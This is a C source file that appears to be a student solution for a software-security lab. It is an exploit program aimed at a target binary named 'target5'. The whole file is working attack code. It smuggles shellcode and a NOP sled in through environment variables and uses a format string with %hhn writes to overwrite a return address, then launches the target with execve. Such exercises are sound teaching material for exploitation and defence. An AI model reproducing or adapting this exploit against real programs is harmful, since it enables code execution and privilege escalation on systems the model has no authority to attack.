#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"

int main(void)
{
  char *args[3];
  char *env[21];

  char dummyword[8] = "aaaaaaa"; // need leave the last byte becasue of \x00 when combining envs, forming a word length used for feeding % 
  char temp[] = "%8x%8x%8x%8x%143x%hhn%29x%hhn%40x%hhn%255x%hhn";
  char temp1[49+sizeof(temp)];
  char RA0[5] = "\x88\xf9\x21\x20"; //we need write 0x2021f9dc in 0x2021f988
  char RA1[5] = "\x89\xf9\x21\x20";
  char RA2[5] = "\x8a\xf9\x21\x20";
  char RA3[5] = "\x8b\xf9\x21\x20";
  char temp2[104];

  int i;

  for(i=0;i<sizeof(temp1);i++){
    if (i<4) temp1[i]=0x90;
    else if (i<49) temp1[i]=shellcode[i-4];
    else temp1[i]=temp[i-49];
  }
  for(i=0;i<104;i++){
    temp2[i]=0x90;
  } // in order to make the buf in target have 256 length

  args[0] = TARGET; args[1] = RA0; args[2] = NULL;
  env[0]="\x00";env[1]="\x00";env[2]="\x00"; //we need to put 4 more 00 in the high address due to the addresses have 8 bytes in 64-bits systems
  env[3]=dummyword;env[4]=RA1;
  env[5]="\x00";env[6]="\x00";env[7]="\x00";
  env[8]=dummyword;env[9]=RA2;
  env[10]="\x00";env[11]="\x00";env[12]="\x00";
  env[13]=dummyword;env[14]=RA3;
  env[15]="\x00";env[16]="\x00";env[17]="\x00";
  env[18]=temp1;
  env[19]=temp2;
  env[20]=NULL; 
  //before shellcode there are exact 60 bytes
  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
